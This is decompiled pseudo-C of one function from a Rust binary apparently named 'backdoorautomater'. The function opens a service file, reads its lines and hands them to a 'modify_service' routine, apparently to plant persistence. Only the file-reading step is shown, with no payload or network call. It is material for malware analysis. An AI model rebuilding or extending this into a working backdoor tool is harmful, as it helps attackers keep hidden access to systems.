
  int64_t backdoorautomater::modifyservice::get_service::h8cd53f8d8d7b2c85(int64_t* arg1, int64_t* arg2, char arg3, int64_t* arg4, int64_t* arg5)

{
    int64_t rax = arg2[1];
    int64_t result_2 = arg2[2] + rax;
    int64_t var_198 = rax;
    int32_t rax_1 = _$LT$core..str..iter..Chars$u20$as$u20$core..iter..traits..double_ended..DoubleEndedIterator$GT$::next_back::h6ef03064f47cabe8(&var_198);
    
    if (rax_1 != 0x2f && rax_1 != 0x110000)
        alloc::string::String::push::h8dfcd488d6c0f12b(arg2);
    
    int128_t var_108;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(
        &var_108, arg1);
    int128_t var_78;
    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_78, 
        arg2);
    int64_t var_f8;
    int64_t var_170 = var_f8;
    int128_t var_180 = var_108;
    var_198 = var_78;
    int64_t var_68;
    int64_t var_188 = var_68;
    int128_t var_158;
    alloc::str::join_generic_copy::h6e3e6eb2fb0da332(&var_158, &var_198, 2, 1, 0);
    int64_t var_148;
    int64_t var_118 = var_148;
    int128_t var_128 = var_158;
    core::ptr::drop_in_place$LT$$u5b$alloc..string..String$u3b$$u20$2$u5d$$GT$::hfd07afc6d277b85d(
        &var_198);
    std::fs::File::open::hc9cc0415293bf7f9(&var_198, &var_128);
    int64_t result;
    
    if (!var_198)
    {
        int128_t var_60;
        std::io::buffered::bufreader::BufReader$LT$R$GT$::with_capacity::hfc22a243c8e8e3e1(&var_60, 
            0x2000, *var_198[4]);
        int64_t var_140 = 0;
        int64_t var_138_1 = 8;
        int64_t var_130_1 = 0;
        int128_t var_40;
        var_180 = var_40;
        int128_t var_50;
        var_188 = var_50;
        var_198 = var_60;
        
        while (true)
        {
            _$LT$std..io..Lines$LT$B$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h114c8ea989dd5339(&var_158, &var_198);
            int64_t rax_5 = var_158;
            
            if (rax_5 == -0x7fffffffffffffff)
            {
                core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_198);
                int64_t var_c8_1 = arg1[2];
                int128_t var_d8 = *arg1;
                int64_t var_a8_1 = arg2[2];
                int128_t var_b8 = *arg2;
                int64_t var_88_1 = var_130_1;
                int128_t var_98 = var_140;
                int64_t var_148_1 = arg4[2];
                var_158 = *arg4;
                int64_t var_188_1 = arg5[2];
                var_198 = *arg5;
                backdoorautomater::modifyservice::modify_service::h70e6f10bf69e7eca(&var_d8, 
                    &var_b8, arg3, &var_98, &var_158, &var_198);
                core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_128);
                return 0;
            }
            
            result = *var_158[8];
            
            if (rax_5 == -0x8000000000000000)
                break;
            
            int64_t var_f0 = rax_5;
            int64_t result_1 = result;
            int64_t var_e0_1 = var_148;
            alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_140, &var_f0);
        }
        
        core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_198);
        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h8814db29c860c5cd(&var_140);
    }
    else
        result = result_2;
    
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_128);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg5);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg4);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg2);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    return result;
}
